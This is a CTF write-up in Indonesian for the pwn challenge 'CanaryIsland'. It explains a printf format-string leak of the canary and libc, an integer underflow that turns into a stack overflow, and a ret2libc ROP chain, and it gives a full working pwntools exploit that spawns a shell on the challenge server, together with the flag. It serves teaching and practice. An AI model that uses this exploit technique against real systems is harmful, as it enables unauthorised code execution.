Writeup: CanaryIsland (Pwn Challenge - SiebersecCTF)

Dokumen ini merangkum analisis kerentanan, struktur memori, dan strategi eksploitasi yang berhasil digunakan untuk menembus tantangan pwn CanaryIsland.

1. Informasi Biner & Mitigasi Keamanan

Sebelum melangkah ke eksploitasi, pemeriksaan awal terhadap biner chal menunjukkan konfigurasi proteksi yang sangat ketat:

Arch: amd64-64-little (64-bit)

RELRO: Full RELRO (Global Offset Table bersifat read-only, mencegah GOT overwrite)

Stack: Canary found (Mencegah modifikasi langsung pada return address tanpa bypass)

NX: NX enabled (Stack tidak dapat dieksekusi, membutuhkan ROP)

PIE: PIE enabled (Posisi biner acak di memori akibat pengaruh ASLR)

2. Analisis Kerentanan (Vulnerability Analysis)

Melalui bedah kode menggunakan analisis statis (reverse engineering), ditemukan dua titik kerentanan utama yang saling berkaitan di dalam fungsi main:

A. Format String Vulnerability (Information Leak)

Program mencetak input nama pengguna secara langsung menggunakan fungsi printf tanpa menggunakan format penentu (format specifier):

lea rax, [format]
mov rdi, rax
call sym.imp.printf  ; Ekivalen dengan printf(format)


Karena parameter dikontrol sepenuhnya oleh pengguna, kita bisa menyisipkan penentu format seperti %p untuk membocorkan nilai registers dan stack memori. Ini adalah kunci untuk melewati proteksi Canary dan ASLR (mencari alamat basis Libc).

B. Integer Underflow & Stack Buffer Overflow

Program meminta ukuran alokasi memori melalui fungsi get_int() dan membatasi input maksimal sebesar 0x4f ($79$ desimal) menggunakan tipe data bertanda (signed integer):

call sym.get_int
cmp dword [var_a4h], 0x4f
jg 0x12f6  ; Jika nilai input > 79, program melompat melewati fgets


Jika kita memasukkan nilai negatif seperti -1, kondisi jg (Jump if Greater) tidak akan terpenuhi karena $-1 < 79$.

Namun, sesaat sebelum fungsi fgets dipanggil untuk membaca payload, program melakukan konversi nilai tersebut menggunakan instruksi movzx (Move with Zero-Extend) dari register 16-bit (ax) ke register 32-bit (ecx):

mov eax, dword [var_a4h]
movzx ecx, ax  ; Nilai -1 (0xffffffff) dikonversi mengambil 16-bit bawah menjadi 0xffff (65535)
mov esi, ecx   ; Memasukkan ukuran baru ke dalam argumen size fgets
call sym.imp.fgets


Instruksi movzx mengubah nilai -1 menjadi 65535. Karena kapasitas buffer s di stack hanya dialokasikan sebesar $88$ byte (dari alamat rbp-0x60 ke posisi Canary di rbp-0x8), batas baca 65535 byte dari fgets memberikan kita celah Stack-based Buffer Overflow yang sangat besar untuk mengontrol Return Address (RIP).

3. Strategi Eksploitasi (Exploit Strategy)

Langkah 1: Membocorkan Canary & Alamat Libc

Berdasarkan visualisasi tata letak stack memori:

Variabel input format berada pada posisi rbp-0xa0.

Jarak dari format ke Canary (rbp-0x8) adalah $0\text{xa0} - 0\text{x8} = 0\text{x98}$ byte ($152$ desimal), yang setara dengan $19$ slot stack 64-bit.

Mengingat pemetaan argumen printf pada arsitektur x86_64 dimulai dari indeks stack ke-6 ditambah 1, maka posisi Canary berada tepat pada indeks format string %27$p.

Posisi Return Address utama (alamat Libc penunjuk fungsi __libc_start_call_main+120) berada tepat pada indeks format string %29$p.

Jarak konstan (offset) dari alamat leak indeks 29 ke Libc Base pada biner libc.so.6 (GLIBC 2.39) yang diberikan adalah tepat 0x2a578.

Langkah 2: Penanganan Badchar (\x0a)

Fungsi fgets memiliki sifat dasar akan berhenti membaca input jika mendeteksi byte Newline (\x0a). Karena ASLR mengacak memori pada setiap eksekusi, ada kemungkinan alamat Canary atau fungsi Libc (seperti system atau /bin/sh) mengandung byte 0x0a secara acak.

Untuk mengatasinya, skrip eksploitasi dikonfigurasi melakukan penyaringan (looping connection) secara otomatis sampai mendapatkan alokasi alamat memori yang bersih dari badchar \x0a.

Langkah 3: ROP Chain & Penyelarasan Stack (MOVAPS Fix)

Kita menyusun rantai instruksi Return-Oriented Programming (ROP) berbasis teknik Ret2Libc:

Isi buffer s dengan padding sampah sebanyak 88 byte ($0\text{x60} - 0\text{x8} = 0\text{x58} = 88$).

Masukkan nilai Canary remote yang berhasil dibocorkan agar program tidak mendeteksi manipulasi stack (__stack_chk_fail).

Masukkan dummy data 8 byte untuk menimpa posisi Saved RBP.

Masukkan gadget ret ekstra. Langkah ini wajib dilakukan untuk meluruskan Stack Alignment kelipatan 16-byte sebelum memicu instruksi movaps di dalam fungsi system pada sistem operasi modern (Ubuntu/Debian).

Masukkan gadget pop rdi; ret untuk menyuplai argumen pertama ke fungsi system.

Masukkan alamat string "/bin/sh" yang berada di dalam Libc.

Masukkan alamat fungsi system dari Libc untuk mengeksekusi shell.

4. Kode Eksploitasi Akhir (Python Script)

Berikut adalah kode eksploitasi final menggunakan pustaka pwntools:

from pwn import *
import time

elf = ELF('./chal')
libc = ELF('./libc.so.6')
context.binary = elf

offset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29

while True:
    try:
        # Menghubungkan ke server tantangan remote
        p = remote('chal.sieberr.live', 21003)
        
        # 1. Bocorkan Canary & Alamat Libc Remote
        p.sendlineafter(b"What is your name?", b"%27$p %29$p")
        p.recvuntil(b"Welcome, ")
        leak_data = p.recvline().strip().split()
        
        canary = int(leak_data[0], 16)
        leak_libc = int(leak_data[1], 16)
        libc.address = leak_libc - offset_libc
        
        # 2. Ambil Gadget ROP dari Libc terhitung
        rop = ROP(libc)
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret = rop.find_gadget(['ret'])[0]
        bin_sh = next(libc.search(b"/bin/sh\x00"))
        system_addr = libc.symbols['system']
        
        # Saringan Badchar \x0a (Memastikan payload tidak terpotong prematur oleh fgets)
        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
        if b'\x0a' in check_bytes:
            p.close()
            continue
            
        log.success(f"Libc Base Remote Sukses: {hex(libc.address)}")
        log.success(f"Canary Remote Sukses: {hex(canary)}")
        
        # 3. Strukturisasi Payload ROP (Padding Buffer: 88 byte)
        payload = b"A" * 88
        payload += p64(canary)
        payload += b"B" * 8          # Saved RBP
        payload += p64(ret)          # Penyelaras Stack 16-byte (MOVAPS Fix)
        payload += p64(pop_rdi)       # Konfigurasi parameter fungsi
        payload += p64(bin_sh)        # RDI = Alamat "/bin/sh"
        payload += p64(system_addr)  # Panggil system()
        
        # 4. Kirim serangan pemicu Integer Underflow
        p.sendlineafter(b"How much space do you want?", b"-1")
        p.sendline(payload)          
        
        # Berikan jeda transmisi soket agar proses perpindahan ke /bin/sh stabil
        time.sleep(0.5)
        p.clean(timeout=0.5)
        
        log.info("Membuka interaksi Shell...")
        p.interactive()
        break
        
    except Exception:
        try: p.close()
        except: pass


Hasil Eksekusi Sukses:

[+] Libc Base Remote Sukses: 0x7020bfd00000
[+] Canary Remote Sukses: 0x7bd421e892945400
[*] Membuka interaksi Shell... Ketik 'cat flag.txt'
[*] Switching to interactive mode
$ cat flag.txt
sctf{C4tS_L0ve_pl4y1Ng_1n_tHe_suN}


5. Kesimpulan

Tantangan CanaryIsland mengajarkan pentingnya melakukan sanitasi tipe data (menghindari konversi implisit signed/unsigned yang berbahaya pada fungsi alokasi ukuran seperti fgets / read) dan menghindari penggunaan printf secara langsung tanpa format specifier yang aman.
